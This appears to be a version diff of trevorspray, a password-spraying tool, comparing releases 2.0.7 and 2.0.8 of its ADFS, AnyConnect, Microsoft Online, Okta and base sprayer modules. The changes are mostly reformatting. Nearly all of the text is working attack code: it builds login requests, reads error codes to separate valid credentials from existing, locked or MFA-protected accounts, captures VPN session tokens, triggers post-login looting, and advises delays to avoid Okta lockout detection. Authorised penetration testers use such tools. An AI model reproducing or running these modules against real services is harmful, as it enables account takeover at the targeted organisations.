### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/msol.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/msol.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/msol.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/msol.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/okta.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/okta.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/okta.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/okta.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/owa.cpython-310.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/owa.cpython-310.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/__pycache__/owa.cpython-39.pyc` & `trevorspray-2.0.8/trevorspray/lib/sprayers/__pycache__/owa.cpython-39.pyc`

 * *Files identical despite different names*

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/adfs.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/adfs.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,94 +1,98 @@
 import logging
 from bs4 import BeautifulSoup
 from .base import BaseSprayModule
-from ..util import is_domain,is_subdomain,is_url
-from urllib.parse import urlparse,parse_qs,urlencode,urlunparse
+from ..util import is_domain, is_subdomain, is_url
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
-log = logging.getLogger('trevorspray.sprayers.adfs')
+log = logging.getLogger("trevorspray.sprayers.adfs")
 
-class ADFS(BaseSprayModule):
 
-    userparm = 'UserName'
-    passparam = 'Password'
+class ADFS(BaseSprayModule):
+    userparm = "UserName"
+    passparam = "Password"
 
     request_data = {
-        'Kmsi': 'true',
-        'AuthMethod': 'FormsAuthentication',
-        'UserName': '{username}',
-        'Password': '{password}'
+        "Kmsi": "true",
+        "AuthMethod": "FormsAuthentication",
+        "UserName": "{username}",
+        "Password": "{password}",
     }
 
     def initialize(self):
-
         discovery = self.trevor.discovery(self.url)
         parsed_url = urlparse(self.url)
         userrealm = discovery.getuserrealm()
-        namespace = userrealm.get('NameSpaceType', 'Unknown')
-        if namespace != 'Federated':
-            log.warning(f'NameSpaceType for {self.url} is "{namespace}", not "Federated". You may want to try the "msol" module instead.')
+        namespace = userrealm.get("NameSpaceType", "Unknown")
+        if namespace != "Federated":
+            log.warning(
+                f'NameSpaceType for {self.url} is "{namespace}", not "Federated". You may want to try the "msol" module instead.'
+            )
 
         if is_domain(self.url) and not is_url(self.url):
-            log.info(f'Specified URL {self.url} is a domain, autodetecting ADFS AuthURL')
-            adfs_url = userrealm.get('AuthURL', '')
+            log.info(
+                f"Specified URL {self.url} is a domain, autodetecting ADFS AuthURL"
+            )
+            adfs_url = userrealm.get("AuthURL", "")
             if adfs_url:
-                log.info(f'Successfully detected ADFS AuthURL: {adfs_url}')
+                log.info(f"Successfully detected ADFS AuthURL: {adfs_url}")
                 self.url = adfs_url
                 parsed_url = urlparse(self.url)
             else:
-                log.warn(f'Failed to detect ADFS AuthURL. Please make sure you specify the full ADFS url (example: https://sts.evilcorp.com/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc=)')
+                log.warn(
+                    f"Failed to detect ADFS AuthURL. Please make sure you specify the full ADFS url (example: https://sts.evilcorp.com/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc=)"
+                )
 
         if not parsed_url.scheme:
-            parsed_url = urlparse(f'https://{urlunparse(parsed_url)}')
+            parsed_url = urlparse(f"https://{urlunparse(parsed_url)}")
 
         # add query parameters if only a domain is specified
         if not parsed_url.query:
-            log.info(f'No query parameters specified in {self.url}, correcting')
-            origin = urlunparse(parsed_url._replace(query='', path=''))
-            self.url = f'{origin}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc='
-            log.info(f'New AuthURL: {self.url}')
+            log.info(f"No query parameters specified in {self.url}, correcting")
+            origin = urlunparse(parsed_url._replace(query="", path=""))
+            self.url = f"{origin}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc="
+            log.info(f"New AuthURL: {self.url}")
 
         return True
 
     def create_request(self, username, password):
-
         request = super().create_request(username, password)
         parsed_url = urlparse(self.url)
 
         # replace dummy username query parameter in the AuthURL
         query = parse_qs(parsed_url.query, keep_blank_values=True)
-        if 'username' in query:
-            query['username'] = [username]
+        if "username" in query:
+            query["username"] = [username]
             parsed_url = parsed_url._replace(query=urlencode(query, doseq=True))
             request.url = urlunparse(parsed_url)
-            log.debug(f'Replaced username in URL, new URL: {request.url}')
-        request.headers['Referrer'] = request.url
-        request.headers['Origin'] = f'{parsed_url.scheme}://{parsed_url.netloc}'
+            log.debug(f"Replaced username in URL, new URL: {request.url}")
+        request.headers["Referrer"] = request.url
+        request.headers["Origin"] = f"{parsed_url.scheme}://{parsed_url.netloc}"
         return request
 
     def check_response(self, response):
-
         valid = False
         exists = None
         locked = None
-        msg = ''
+        msg = ""
 
-        status_code = getattr(response, 'status_code', 0)
-        cookies = getattr(response, 'cookies', {})
-        content = getattr(response, 'content', b'')
-        msg = f'Status code: {status_code}, Response length: {len(content)}' + \
-            (f', Cookies: {dict(cookies)}' if cookies else '')
+        status_code = getattr(response, "status_code", 0)
+        cookies = getattr(response, "cookies", {})
+        content = getattr(response, "content", b"")
+        msg = f"Status code: {status_code}, Response length: {len(content)}" + (
+            f", Cookies: {dict(cookies)}" if cookies else ""
+        )
 
-        error_msg = ''
+        error_msg = ""
         if content:
-            soup = BeautifulSoup(content, 'html.parser')
-            found = soup.find(id='errorText')
-            error_msg = getattr(found, 'text', '')
+            soup = BeautifulSoup(content, "html.parser")
+            found = soup.find(id="errorText")
+            error_msg = getattr(found, "text", "")
 
         if error_msg:
-            msg = f'{msg} {error_msg}'
+            msg = f"{msg} {error_msg}"
 
         if status_code == 302:
             exists = True
             valid = True
 
-        return (valid, exists, locked, msg)
+        return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/anyconnect.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/anyconnect.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,192 +1,195 @@
 import logging
 import requests
 from lxml import etree
 from ..util import request
 from contextlib import suppress
 from .base import BaseSprayModule
-from urllib.parse import urlparse,urlunparse
+from urllib.parse import urlparse, urlunparse
 
-log = logging.getLogger('trevorspray.sprayers.anyconnect')
+log = logging.getLogger("trevorspray.sprayers.anyconnect")
 
-class AnyConnect(BaseSprayModule):
 
-    body_xml = '''<?xml version="1.0" encoding="UTF-8"?>
+class AnyConnect(BaseSprayModule):
+    body_xml = """<?xml version="1.0" encoding="UTF-8"?>
 <config-auth client="vpn" type="auth-reply">
   <version who="vpn">4.10.01075</version>
   <device-id>win</device-id>
   {groupxml}
   <auth>
     <username>{username}</username>
     <password>{password}</password>
   </auth>
   <group-select>{group}</group-select>
-</config-auth>'''
-    
-    body_plain = 'group_list={group}&username={username}&password={password}&secondary_username=&secondary_password='
-    body_plain_no_group = 'username={username}&password={password}'
+</config-auth>"""
+
+    body_plain = "group_list={group}&username={username}&password={password}&secondary_username=&secondary_password="
+    body_plain_no_group = "username={username}&password={password}"
 
     headers_xml = {
-        'User-Agent': 'AnyConnect Windows 4.10.01075',
-        'Accept-Encoding': 'gzip, deflate',
-        'X-Transcend-Version': '1',
-        'X-Aggregate-Auth': '1',
-        'X-AnyConnect-Platform': 'win',
-        'X-Support-HTTP-Auth': 'true',
-        'Content-Type': 'application/xml; charset=utf-8'
+        "User-Agent": "AnyConnect Windows 4.10.01075",
+        "Accept-Encoding": "gzip, deflate",
+        "X-Transcend-Version": "1",
+        "X-Aggregate-Auth": "1",
+        "X-AnyConnect-Platform": "win",
+        "X-Support-HTTP-Auth": "true",
+        "Content-Type": "application/xml; charset=utf-8",
     }
 
     headers_plain = {
-        'User-Agent': 'AnyConnect Windows 4.10.01075',
-        'Cookie': 'webvpnlogin=1',
-        'Accept': '*/*',
-        'Accept-Encoding': 'gzip, deflate',
-        'X-Transcend-Version': '1',
-        'X-Support-HTTP-Auth': 'true',
-        'Content-Type': 'application/x-www-form-urlencoded'
+        "User-Agent": "AnyConnect Windows 4.10.01075",
+        "Cookie": "webvpnlogin=1",
+        "Accept": "*/*",
+        "Accept-Encoding": "gzip, deflate",
+        "X-Transcend-Version": "1",
+        "X-Support-HTTP-Auth": "true",
+        "Content-Type": "application/x-www-form-urlencoded",
     }
 
     def initialize(self):
-
-        url = urlunparse(urlparse(self.url)._replace(query='', path='/'))
+        url = urlunparse(urlparse(self.url)._replace(query="", path="/"))
 
         s = requests.Session()
 
         initial_response = request(
-            method='POST',
+            method="POST",
             url=url,
             headers=self.headers_xml,
-            data=f'''<?xml version="1.0" encoding="UTF-8"?>
+            data=f"""<?xml version="1.0" encoding="UTF-8"?>
 <config-auth client="vpn" type="init">
   <version who="vpn">4.10.01075</version>
   <device-id>win</device-id>
   <group-access>{self.url}</group-access>
-</config-auth>''',
+</config-auth>""",
             allow_redirects=False,
-            session=s
+            session=s,
         )
 
         tunnelgroups = {}
         selected_tunnelgroup = None
 
         # XML auth
-        if getattr(initial_response, 'status_code', 0) == 200:
-            self.auth_type = 'xml'
-            log.info('Detected XML auth')
+        if getattr(initial_response, "status_code", 0) == 200:
+            self.auth_type = "xml"
+            log.info("Detected XML auth")
             self.request_data = self.body_xml
             self.headers = self.headers_xml
             try:
                 parsed_initial_response = etree.fromstring(initial_response.content)
             except Exception as e:
-                log.error(f'Error parsing content: {e}, {initial_response.content}')
+                log.error(f"Error parsing content: {e}, {initial_response.content}")
                 return False
-            for tunnelgroup in parsed_initial_response.iterfind('.//opaque'):
-                group = tunnelgroup.find('tunnel-group').text
-                groupname = tunnelgroup.find('group-alias').text
+            for tunnelgroup in parsed_initial_response.iterfind(".//opaque"):
+                group = tunnelgroup.find("tunnel-group").text
+                groupname = tunnelgroup.find("group-alias").text
                 if group and groupname:
                     tunnelgroups[groupname] = {
-                        'group': group,
-                        'groupxml': etree.tostring(tunnelgroup).decode(),
-                        'groupname': groupname
+                        "group": group,
+                        "groupxml": etree.tostring(tunnelgroup).decode(),
+                        "groupname": groupname,
                     }
 
         # plain auth
-        elif getattr(initial_response, 'status_code', 0) in (301, 302, 303):
-            self.auth_type = 'plain'
+        elif getattr(initial_response, "status_code", 0) in (301, 302, 303):
+            self.auth_type = "plain"
             self.headers = self.headers_plain
-            host = '/'.join(initial_response.url.split('/', 3)[:3])
-            response_location = initial_response.headers['Location']
-            if response_location.lower().startswith('http'):
+            host = "/".join(initial_response.url.split("/", 3)[:3])
+            response_location = initial_response.headers["Location"]
+            if response_location.lower().startswith("http"):
                 self.url = str(response_location)
             else:
-                self.url = host + initial_response.headers['Location']
-            log.info(f'Detected plain auth, redirecting to {self.url}')
+                self.url = host + initial_response.headers["Location"]
+            log.info(f"Detected plain auth, redirecting to {self.url}")
             plain_response = request(
                 url=self.url,
                 headers={
-                    'User-Agent': 'AnyConnect Windows 4.10.01075',
-                    'Accept': '*/*',
-                    'Accept-Encoding': 'gzip, deflate',
-                    'X-Transcend-Version': '1',
-                    'X-Support-HTTP-Auth': 'true',
-                    'Content-Type': 'application/x-www-form-urlencoded'
+                    "User-Agent": "AnyConnect Windows 4.10.01075",
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "X-Transcend-Version": "1",
+                    "X-Support-HTTP-Auth": "true",
+                    "Content-Type": "application/x-www-form-urlencoded",
                 },
-                session=s
+                session=s,
             )
-            if getattr(plain_response, 'status_code', 0) == 200:
+            if getattr(plain_response, "status_code", 0) == 200:
                 try:
                     parsed_plain_response = etree.fromstring(plain_response.content)
                 except Exception as e:
-                    log.error(f'Error parsing content: {e}, {plain_response.content}')
+                    log.error(f"Error parsing content: {e}, {plain_response.content}")
                     return False
-                for option in parsed_plain_response.iterfind('.//option'):
-                    group = option.attrib.get('value', '')
+                for option in parsed_plain_response.iterfind(".//option"):
+                    group = option.attrib.get("value", "")
                     groupname = option.text
                     if group and groupname:
                         tunnelgroups[groupname] = {
-                            'group': group,
-                            'groupname': groupname
+                            "group": group,
+                            "groupname": groupname,
                         }
             else:
-                log.error(f'{plain_response} while visiting {self.url}')
+                log.error(f"{plain_response} while visiting {self.url}")
                 return False
             if tunnelgroups:
                 self.request_data = self.body_plain
             else:
                 self.request_data = self.body_plain_no_group
 
         else:
-            status_code = getattr(initial_response, 'status_code', 0)
+            status_code = getattr(initial_response, "status_code", 0)
             log.error(f'Received invalid response code "{status_code}" from url: {url}')
 
         if len(tunnelgroups) == 1:
             for alias, tunnelgroup in tunnelgroups.items():
                 selected_tunnelgroup = tunnelgroup
                 log.info(f'Found tunnel group "{alias}"')
 
         elif tunnelgroups:
             while selected_tunnelgroup is None:
                 try:
-                    tunnelgroup = tunnelgroups[self.globalparams.get('group', None)]
+                    tunnelgroup = tunnelgroups[self.globalparams.get("group", None)]
                     selected_tunnelgroup = tunnelgroup
                 except KeyError:
                     pass
                 try:
-                    tunnelgroup = tunnelgroups[input(f'[USER] Select group: [{"|".join(tunnelgroups.keys())}]: ')]
+                    tunnelgroup = tunnelgroups[
+                        input(
+                            f'[USER] Select group: [{"|".join(tunnelgroups.keys())}]: '
+                        )
+                    ]
                     selected_tunnelgroup = tunnelgroup
                 except KeyError:
-                    log.error('Invalid choice.')
+                    log.error("Invalid choice.")
                 log.debug(f'Using tunnel group {selected_tunnelgroup["groupname"]}:')
-                for k,v in selected_tunnelgroup.items():
-                    log.debug(f'    {k}: {v}')
+                for k, v in selected_tunnelgroup.items():
+                    log.debug(f"    {k}: {v}")
 
         if selected_tunnelgroup:
             log.info(f'Using tunnel group "{selected_tunnelgroup["groupname"]}"')
-            self.request_data = self.request_data.replace('{groupxml}', selected_tunnelgroup.pop('groupxml', ''))
+            self.request_data = self.request_data.replace(
+                "{groupxml}", selected_tunnelgroup.pop("groupxml", "")
+            )
             self.globalparams.update(selected_tunnelgroup)
 
         return True
 
-
     def check_response(self, response):
-
         valid = False
         exists = None
         locked = None
-        msg = 'Login failed.'
+        msg = "Login failed."
 
-        log.debug(f'Response: {response.content}')
+        log.debug(f"Response: {response.content}")
 
         parsed_response_content = etree.fromstring(response.content)
-        for error in parsed_response_content.iterfind('.//error'):
+        for error in parsed_response_content.iterfind(".//error"):
             msg = error.text
 
-        session_token = ''
+        session_token = ""
         with suppress(Exception):
-            session_token = parsed_response_content.find('.//session-token').text
+            session_token = parsed_response_content.find(".//session-token").text
 
         if len(session_token) > 10:
             exists = True
             valid = True
-            msg = f'SESSION TOKEN: {session_token}'
+            msg = f"SESSION TOKEN: {session_token}"
 
         return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/base.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/base.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,148 +1,144 @@
 import logging
 import requests
 from time import sleep
 from urllib.parse import quote
 from ..util import windows_user_agent
 from ..errors import TREVORSprayError
 
-log = logging.getLogger('trevorspray.sprayers.base')
+log = logging.getLogger("trevorspray.sprayers.base")
 
-class BaseSprayModule:
 
+class BaseSprayModule:
     # HTTP method
-    method = 'POST'
+    method = "POST"
     # default target URL
     default_url = None
     # alternative IPv6 URL
     ipv6_url = None
     # name of username parameter
-    userparam = 'username'
+    userparam = "username"
     # name of password parameter
-    passparam = 'password'
+    passparam = "password"
     # other global parameters
     globalparams = {}
     # body of request
     request_data = None
     request_json = None
     # HTTP headers
     headers = {}
     # HTTP cookies
     cookies = {}
     # Don't count nonexistent accounts as failed logons
     fail_nonexistent = True
     # Module for looting after successful login
     looter = None
     # How many times to retry HTTP requests
-    retries = 'infinite'
+    retries = "infinite"
 
     def __init__(self, trevor):
-
-        log.debug(f'Initializing sprayer')
+        log.debug(f"Initializing sprayer")
 
         self.url = None
         self.trevor = trevor
         if self.trevor.options.url is not None:
             self.url = str(self.trevor.options.url)
         elif self.default_url is not None:
             self.url = str(self.default_url)
 
-        if self.ipv6_url and self.url == self.default_url and self.trevor.options.prefer_ipv6:
+        if (
+            self.ipv6_url
+            and self.url == self.default_url
+            and self.trevor.options.prefer_ipv6
+        ):
             self.url = self.ipv6_url
 
         if not self.url:
-            raise TREVORSprayError('Please specify a --url to spray against')
+            raise TREVORSprayError("Please specify a --url to spray against")
 
         # make sure we have a user-agent
-        if not self.headers.get('User-Agent', ''):
-            self.headers['User-Agent'] = windows_user_agent
-
+        if not self.headers.get("User-Agent", ""):
+            self.headers["User-Agent"] = windows_user_agent
 
     def initialize(self):
         return True
 
-
     def create_params(self, username, password):
-
-        return {
-            self.userparam: username,
-            self.passparam: password
-        }
-
+        return {self.userparam: username, self.passparam: password}
 
     def create_request(self, username, password):
-        '''
+        """
         Returns request.Request() object
-        '''
+        """
 
         runtimeparams = self.create_params(username, password)
 
         data = None
         params = dict(self.globalparams)
         params.update(runtimeparams)
         params.update(self.trevor.runtimeparams)
 
         try:
             url = self.url.format(**params)
         except Exception as e:
-            log.error(f'Error preparing URL "{self.url}" with the following parameters: {params}: {e} (-v to debug)')
+            log.error(
+                f'Error preparing URL "{self.url}" with the following parameters: {params}: {e} (-v to debug)'
+            )
             if log.level <= logging.DEBUG:
                 import traceback
+
                 log.error(traceback.format_exc())
             url = str(self.url)
-            log.error(f'Continuing with URL "{url}". If this doesn\'t look right, press CTRL+C to cancel.')
+            log.error(
+                f'Continuing with URL "{url}". If this doesn\'t look right, press CTRL+C to cancel.'
+            )
             sleep(4)
 
-        if not url.lower().startswith('http'):
-            url = f'https://{url}'
+        if not url.lower().startswith("http"):
+            url = f"https://{url}"
 
         if type(self.request_data) == dict:
             data = dict(self.request_data)
-            data.update({k:v for k,v in params.items() if k in data})
+            data.update({k: v for k, v in params.items() if k in data})
         elif type(self.request_data) == str:
-            escaped_params = {k: quote(v) for k,v in params.items()}
+            escaped_params = {k: quote(v) for k, v in params.items()}
             data = self.request_data.format(**escaped_params)
 
         json = None
         if type(self.request_json) == dict:
             json = dict(self.request_json)
-            json.update({k:v for k,v in params.items() if k in json})
+            json.update({k: v for k, v in params.items() if k in json})
 
         return requests.Request(
             method=self.method,
             url=url,
             headers=self.headers,
             cookies=self.cookies,
             data=data,
-            json=json
+            json=json,
         )
 
-
     def check_response(self, response):
-        '''
+        """
         returns (valid, exists, locked, msg)
-        '''
+        """
 
         valid = False
         exists = None
         locked = None
-        msg = ''
+        msg = ""
 
-        if getattr(response, 'status_code', 0) == 200:
+        if getattr(response, "status_code", 0) == 200:
             valid = True
             exists = True
-            msg = 'Valid cred'
+            msg = "Valid cred"
 
         return (valid, exists, locked, msg)
 
-
     def loot(self, credential):
-
         if self.looter is not None:
             looter = self.looter(self, credential)
             looter.run()
 
-
     @property
     def id(self):
-
-        return f'{self.__class__.__name__}|{self.url}'
+        return f"{self.__class__.__name__}|{self.url}"
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/example.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/example.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,57 +1,52 @@
 # Example spray module
 
 from .base import BaseSprayModule
 
-class SprayModule(BaseSprayModule):
 
+class SprayModule(BaseSprayModule):
     # HTTP method
-    method = 'POST'
+    method = "POST"
     # default target URL
-    default_url = 'https://login.evilcorp.com/'
+    default_url = "https://login.evilcorp.com/"
     # body of request
-    #request_data = 'user={username}&pass={password}&group={otherthing}'
-    request_json = {
-        'wat': 'wut'
-    }
-    userparam = 'usr'
+    # request_data = 'user={username}&pass={password}&group={otherthing}'
+    request_json = {"wat": "wut"}
+    userparam = "usr"
     # name of password parameter
-    passparam = 'pswd'
+    passparam = "pswd"
     # HTTP headers
     headers = {}
     # HTTP cookies
     cookies = {}
     # Don't count nonexistent accounts as failed logons
     fail_nonexistent = False
 
     headers = {
-        'User-Agent': 'Your Moms Smart Vibrator',
+        "User-Agent": "Your Moms Smart Vibrator",
     }
 
     def initialize(self):
-        '''
+        """
         Get additional arguments from user at runtime
-        '''
-        while not self.runtimeparams.get('otherthing', ''):
-            self.runtimeparams.update({
-                'otherthing': input("What's that other thing?")
-            })
+        """
+        while not self.runtimeparams.get("otherthing", ""):
+            self.runtimeparams.update({"otherthing": input("What's that other thing?")})
 
         return True
 
-
     def check_response(self, response):
-        '''
+        """
         returns (valid, exists, locked, msg)
-        '''
+        """
 
         valid = False
         exists = None
         locked = None
-        msg = ''
+        msg = ""
 
-        if getattr(response, 'status_code', 0) == 200:
+        if getattr(response, "status_code", 0) == 200:
             valid = True
             exists = True
-            msg = 'Valid cred'
+            msg = "Valid cred"
 
-        return (valid, exists, locked, msg)
+        return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/msol.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/msol.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,136 +1,139 @@
 import uuid
 import logging
 from contextlib import suppress
 from .base import BaseSprayModule
 from ..looters.msol import MSOLLooter
 
-log = logging.getLogger('trevorspray.sprayers.msol')
+log = logging.getLogger("trevorspray.sprayers.msol")
 
-class MSOL(BaseSprayModule):
 
+class MSOL(BaseSprayModule):
     # default target URL
-    default_url = 'https://login.microsoft.com/common/oauth2/token'
-    ipv6_url = 'https://prdv6a.aadg.msidentity.com/common/oauth2/token'
+    default_url = "https://login.microsoft.com/common/oauth2/token"
+    ipv6_url = "https://prdv6a.aadg.msidentity.com/common/oauth2/token"
 
     fail_nonexistent = False
 
     request_data = {
-        'resource': 'https://graph.windows.net',
-        'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
-        'client_info': '1',
-        'grant_type': 'password',
-        'scope': 'openid',
-        'username': '{username}',
-        'password': '{password}'
+        "resource": "https://graph.windows.net",
+        "client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
+        "client_info": "1",
+        "grant_type": "password",
+        "scope": "openid",
+        "username": "{username}",
+        "password": "{password}",
     }
 
     headers = {
-        'Accept': 'application/json',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
+        "Accept": "application/json",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Windows-AzureAD-Authentication-Provider/1.0",
     }
 
     looter = MSOLLooter
 
     def initialize(self):
-
         if self.trevor.options.prefer_ipv6 and self.url == self.ipv6_url:
-            self.headers['Host'] = 'login.microsoft.com'
+            self.headers["Host"] = "login.microsoft.com"
 
         discovery = self.trevor.discovery(self.trevor.domain)
         if discovery is not None:
             userrealm = discovery.getuserrealm()
-            namespace = userrealm.get('NameSpaceType', 'Unknown')
-            if namespace == 'Federated':
-                log.warning(f'NameSpaceType for {self.trevor.domain} is "{namespace}", not "Managed". You may want to try the "adfs" module instead.')
+            namespace = userrealm.get("NameSpaceType", "Unknown")
+            if namespace == "Federated":
+                log.warning(
+                    f'NameSpaceType for {self.trevor.domain} is "{namespace}", not "Managed". You may want to try the "adfs" module instead.'
+                )
 
         return True
 
     def create_request(self, *args, **kwargs):
-
         request = super().create_request(*args, **kwargs)
         if self.trevor.options.random_useragent:
-            request.data['client_id'] = str(uuid.uuid4())
+            request.data["client_id"] = str(uuid.uuid4())
         return request
 
     def check_response(self, response):
-
         exists = False
         valid = False
         locked = False
-        msg = ''
+        msg = ""
 
-        status_code = getattr(response, 'status_code', 0)
+        status_code = getattr(response, "status_code", 0)
 
         if status_code == 200:
             exists = True
             valid = True
 
         else:
             r = {}
             with suppress(Exception):
                 r = response.json()
                 exists = True
 
-            error = r.get('error_description', '')
+            error = r.get("error_description", "")
             if error:
                 log.debug(error)
 
-            if 'AADSTS50126' in error:
-                msg = f'AADSTS50126: Invalid email or password. Account could exist.'
+            if "AADSTS50126" in error:
+                msg = f"AADSTS50126: Invalid email or password. Account could exist."
 
-            elif 'AADSTS50128' in error or 'AADSTS50059' in error:
+            elif "AADSTS50128" in error or "AADSTS50059" in error:
                 exists = False
-                msg = f'AADSTS50128: Tenant for account doesn\'t exist. Check the domain to make sure they are using Azure/O365 services.'
+                msg = f"AADSTS50128: Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services."
+
+            elif "AADSTS90072" in error:
+                valid = True
+                msg = f"AADSTS90072: Valid credential, but not for this tenant."
 
-            elif 'AADSTS90072' in error:
+            elif "AADSTS530031" in error:
                 valid = True
-                msg = f'AADSTS90072: Valid credential, but not for this tenant.'
+                msg = f"AADSTS530031: Valid credential, but access policy does not allow token issuance."
 
-            elif 'AADSTS50034' in error:
+            elif "AADSTS50034" in error:
                 exists = False
-                msg = f'AADSTS50034: User does not exist.'
+                msg = f"AADSTS50034: User does not exist."
 
-            elif 'AADSTS50079' in error or 'AADSTS50076' in error:
+            elif "AADSTS50079" in error or "AADSTS50076" in error:
                 valid = True
                 # Microsoft MFA response
-                msg = f'AADSTS50079: The response indicates MFA (Microsoft) is in use.'
+                msg = f"AADSTS50079: The response indicates MFA (Microsoft) is in use."
 
-            elif 'AADSTS50055' in error:
+            elif "AADSTS50055" in error:
                 valid = True
                 # User password is expired
-                msg = f'AADSTS50055: The user\'s password is expired.'
+                msg = f"AADSTS50055: The user's password is expired."
 
-            elif 'AADSTS50131' in error:
+            elif "AADSTS50131" in error:
                 valid = True
                 # Password is correct but login was blocked
-                msg = 'AADSTS50131: Correct password but login was blocked.'
+                msg = "AADSTS50131: Correct password but login was blocked."
 
-            elif 'AADSTS50158' in error:
+            elif "AADSTS50158" in error:
                 valid = True
                 # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
-                msg = 'AADSTS50158: The response indicates conditional access (MFA: DUO or other) is in use.'
+                msg = "AADSTS50158: The response indicates conditional access (MFA: DUO or other) is in use."
 
-            elif 'AADSTS50053' in error:
+            elif "AADSTS50053" in error:
                 locked = True
-                exists = None # M$ gets nasty and sometimes lies about this
+                exists = None  # M$ gets nasty and sometimes lies about this
                 # Locked out account or Smart Lockout in place
-                msg = f'AADSTS50053: Account appears to be locked.'
+                msg = f"AADSTS50053: Account appears to be locked."
 
-            elif 'AADSTS50056' in error:
-                msg = f'AADSTS50056: Account exists but does not have a password in Azure AD.'
+            elif "AADSTS50056" in error:
+                msg = f"AADSTS50056: Account exists but does not have a password in Azure AD."
 
-            elif 'AADSTS80014' in error:
-                msg = f'AADSTS80014: Account exists, but the maximum Pass-through Authentication time was exceeded.'
+            elif "AADSTS80014" in error:
+                msg = f"AADSTS80014: Account exists, but the maximum Pass-through Authentication time was exceeded."
 
-            elif 'AADSTS50057' in error:
+            elif "AADSTS50057" in error:
                 # Disabled account
-                msg = f'AADSTS50057: The account appears to be disabled.'
+                msg = f"AADSTS50057: The account appears to be disabled."
 
             else:
                 valid = None
                 exists = None
-                content = getattr(response, 'content', '')
-                msg = f'HTTP {status_code}: Got an error we haven\'t seen yet: {(r if r else content)}'
+                content = getattr(response, "content", "")
+                msg = f"HTTP {status_code}: Got an error we haven't seen yet: {(r if r else content)}"
 
-        return (valid, exists, locked, msg)
+        return (valid, exists, locked, msg)
```

### Comparing `trevorspray-2.0.7/trevorspray/lib/sprayers/okta.py` & `trevorspray-2.0.8/trevorspray/lib/sprayers/okta.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,70 +1,74 @@
 import logging
 from contextlib import suppress
 from .base import BaseSprayModule
 from ..util import highlight_json
 
-log = logging.getLogger('trevorspray.sprayers.okta')
+log = logging.getLogger("trevorspray.sprayers.okta")
 
-class Okta(BaseSprayModule):
 
+class Okta(BaseSprayModule):
     # default target URL
-    default_url = 'https://{subdomain}.okta.com/api/v1/authn'
+    default_url = "https://{domain}/api/v1/authn"
 
     request_json = {
-        'options': {
-            'warnBeforePasswordExpired': True,
-            'multiOptionalFactorEnroll': True
+        "options": {
+            "warnBeforePasswordExpired": True,
+            "multiOptionalFactorEnroll": True,
         },
-        'subdomain': '{subdomain}',
-        'username': '{username}',
-        'password': '{password}'
+        "domain": "{domain}",
+        "username": "{username}",
+        "password": "{password}",
     }
 
     headers = {
-        'X-Requested-With': 'XMLHttpRequest',
-        'X-Okta-User-Agent-Extended': 'okta-signin-widget-5.14.1',
-        'Accept': 'application/json',
-        'Content-Type': 'application/json',
+        "X-Requested-With": "XMLHttpRequest",
+        "X-Okta-User-Agent-Extended": "okta-signin-widget-5.14.1",
+        "Accept": "application/json",
+        "Content-Type": "application/json",
     }
 
     def initialize(self):
-
         if not self.trevor.options.delay or self.trevor.options.jitter:
-            log.warning(f'Okta hides lockout failures by default! --delay is recommended.')
-
-        while not self.trevor.runtimeparams.get('subdomain', ''):
-            self.trevor.runtimeparams.update({
-                'subdomain': input('\n[USER] Enter target subdomain (<subdomain>.okta.com): ').strip()
-            })
+            log.warning(
+                f"Okta hides lockout failures by default! --delay is recommended."
+            )
+
+        while not self.trevor.runtimeparams.get("domain", ""):
+            self.trevor.runtimeparams.update(
+                {
+                    "domain": input(
+                        "\n[USER] Enter target domain (e.g. customer.okta.com): "
+                    ).strip()
+                }
+            )
 
